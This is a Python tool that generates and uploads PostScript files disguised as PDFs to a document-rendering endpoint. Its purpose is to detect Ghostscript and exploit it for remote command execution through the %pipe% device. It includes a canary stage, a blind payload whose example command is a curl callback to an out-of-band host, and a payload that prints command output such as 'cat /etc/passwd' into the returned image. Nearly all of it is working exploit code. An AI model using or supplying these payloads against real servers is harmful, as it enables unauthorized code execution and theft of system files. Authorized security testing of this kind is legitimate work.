#!/usr/bin/env python3
"""
Test whether a "PDF -> render to image (base64)" endpoint is actually
shelling out to Ghostscript (directly, or via ImageMagick's PDF delegate)
to do the rendering. If so, it's a classic PostScript-injection RCE class
(same family as CVE-2018-16509 / "ImageTragick"), because Ghostscript is
lenient about file-format detection: a file with a .pdf name/extension
whose *content* is plain PostScript (%!PS header, no PDF structure at
all) still gets interpreted as a PostScript program by `gs`.

Two stages:
  1. canary  -- harmless, just draws visible text via the PS `show`
                operator. If the returned image shows that text, the
                renderer is a real PostScript interpreter (Ghostscript,
                or something PS-compatible) -- NOT a pure-Java library
                like PDFBox's PDFRenderer (which would reject/ignore
                this, since it isn't valid PDF at all).
  2. pipe-rce -- only try this AFTER canary confirms Ghostscript. Opens
                the `%pipe%<command>` pseudo-file, which spawns <command>
                as a subprocess. Works only if -dSAFER isn't enforced
                (or is bypassed) by the version in use -- version
                dependent, so this may need tweaking.

Usage:
  python3 pdf_render_rce_test.py canary -o canary.pdf
  python3 pdf_render_rce_test.py pipe-rce --shell-cmd "curl http://YOUR-OOB-HOST/hit" -o rce.pdf
  python3 pdf_render_rce_test.py visible-rce --shell-cmd "id" -o visible.pdf
  python3 pdf_render_rce_test.py upload --url https://target/api/render --field file --pdf canary.pdf --token "$TOKEN"

`visible-rce` is like pipe-rce, but instead of (or in addition to) an OOB
callback, it reads the command's stdout back into PostScript and draws it
as text on the page -- so if the target's renderer isn't SAFER-restricted,
the command output shows up directly in the base64 image the app returns
to you. No OOB listener needed to prove it.
"""

import argparse
import base64
import sys


def canary_ps() -> bytes:
    # Pure PostScript, deliberately has NO %PDF header and no PDF object
    # structure -- if the target's converter renders this as an image
    # with "GS-RENDER-CONFIRMED" drawn on it, it fed the raw bytes to a
    # real PostScript interpreter.
    return b"""%!PS-Adobe-3.0
/Times-Bold findfont 36 scalefont setfont
72 400 moveto
(GS-RENDER-CONFIRMED) show
showpage
"""


def pipe_rce_ps(cmd: str) -> bytes:
    # Classic %pipe% device abuse -- opening it for write spawns `cmd`
    # as a subprocess with a pipe as its stdin. This is the core
    # primitive behind the ImageTragick/Ghostscript RCE family.
    escaped_cmd = cmd.replace("(", "\\(").replace(")", "\\)")
    return f"""%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{ null restore }} stopped {{ pop }} if
{{ legal }} stopped {{ pop }} if
userdict /showpage {{}} put
save mark
/OutputFile (%pipe%{escaped_cmd}) (w) file
OutputFile (triggered\\n) writestring
OutputFile flushfile
OutputFile closefile
""".encode()


def visible_rce_ps(cmd: str) -> bytes:
    # Opens %pipe%<cmd> for READ instead of write -- this spawns cmd with
    # its stdout wired to the pipe we read from. Read it line by line and
    # `show` each line onto the page, so if -dSAFER doesn't block %pipe%,
    # the command's actual output is what shows up in the rendered image.
    escaped_cmd = cmd.replace("(", "\\(").replace(")", "\\)")
    return f"""%!PS-Adobe-3.0
<< /PageSize [612 792] /Orientation 0 >> setpagedevice
/Courier findfont 12 scalefont setfont
/lineh 16 def
/y 760 def
/linebuf 250 string def
/p (%pipe%{escaped_cmd}) (r) file def
{{
  p linebuf readline
  {{
    40 y moveto
    show
    /y y lineh sub def
  }}
  {{
    40 y moveto
    show
    exit
  }}
  ifelse
}} loop
p closefile
showpage
""".encode()


def decode_response_image(b64_or_json_path: str):
    """Quick helper: given a raw base64 string (or a file containing one),
    decode it to a PNG/JPEG so you can eyeball it for the canary text."""
    with open(b64_or_json_path) as f:
        data = f.read().strip()
    # tolerate a data: URI prefix
    if data.startswith("data:") and "," in data:
        data = data.split(",", 1)[1]
    img_bytes = base64.b64decode(data)
    out = "decoded_response.png"
    with open(out, "wb") as f:
        f.write(img_bytes)
    print(f"[+] wrote {out} -- open it and look for 'GS-RENDER-CONFIRMED'")


def upload(url: str, field: str, pdf_path: str, token: str):
    import requests

    with open(pdf_path, "rb") as f:
        data = f.read()
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    files = {field: ("test.pdf", data, "application/pdf")}
    resp = requests.post(url, headers=headers, files=files, timeout=30)
    print(f"status={resp.status_code}")
    print(resp.text[:2000])
    # if the response body itself is/has base64 image data, try to save it
    try:
        import json
        j = resp.json()
        for k, v in (j.items() if isinstance(j, dict) else []):
            if isinstance(v, str) and len(v) > 200:
                try:
                    img = base64.b64decode(v)
                    fn = f"resp_{k}.png"
                    with open(fn, "wb") as f:
                        f.write(img)
                    print(f"[+] decoded field '{k}' -> {fn}")
                except Exception:
                    pass
    except Exception:
        pass


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="action", required=True)

    c = sub.add_parser("canary")
    c.add_argument("-o", "--output", default="canary.pdf")

    p = sub.add_parser("pipe-rce")
    p.add_argument("--shell-cmd", required=True, help="shell command to run on the server, e.g. 'curl http://oob-host/hit'")
    p.add_argument("-o", "--output", default="rce.pdf")

    v = sub.add_parser("visible-rce")
    v.add_argument("--shell-cmd", required=True, help="shell command whose OUTPUT gets drawn onto the rendered page, e.g. 'id' or 'cat /etc/passwd'")
    v.add_argument("-o", "--output", default="visible.pdf")

    d = sub.add_parser("decode")
    d.add_argument("path", help="file containing the base64 (or data: URI) response")

    u = sub.add_parser("upload")
    u.add_argument("--url", required=True)
    u.add_argument("--field", default="file")
    u.add_argument("--pdf", required=True)
    u.add_argument("--token", default="")

    args = ap.parse_args()

    if args.action == "canary":
        with open(args.output, "wb") as f:
            f.write(canary_ps())
        print(f"[+] wrote {args.output} -- upload this first, decode the response image, "
              "look for the text 'GS-RENDER-CONFIRMED'")
    elif args.action == "pipe-rce":
        with open(args.output, "wb") as f:
            f.write(pipe_rce_ps(args.shell_cmd))
        print(f"[+] wrote {args.output} -- run this ONLY after canary confirms Ghostscript rendering. "
              "Use an OOB command (curl/nslookup to a listener you control) so you get a clear "
              "yes/no signal, don't rely on the image response for this stage.")
    elif args.action == "visible-rce":
        with open(args.output, "wb") as f:
            f.write(visible_rce_ps(args.shell_cmd))
        print(f"[+] wrote {args.output} -- command output will be drawn as text on the rendered page "
              "if -dSAFER doesn't block %pipe% on the target. Decode the response image and read it directly.")
    elif args.action == "decode":
        decode_response_image(args.path)
    elif args.action == "upload":
        upload(args.url, args.field, args.pdf, args.token)


if __name__ == "__main__":
    main()
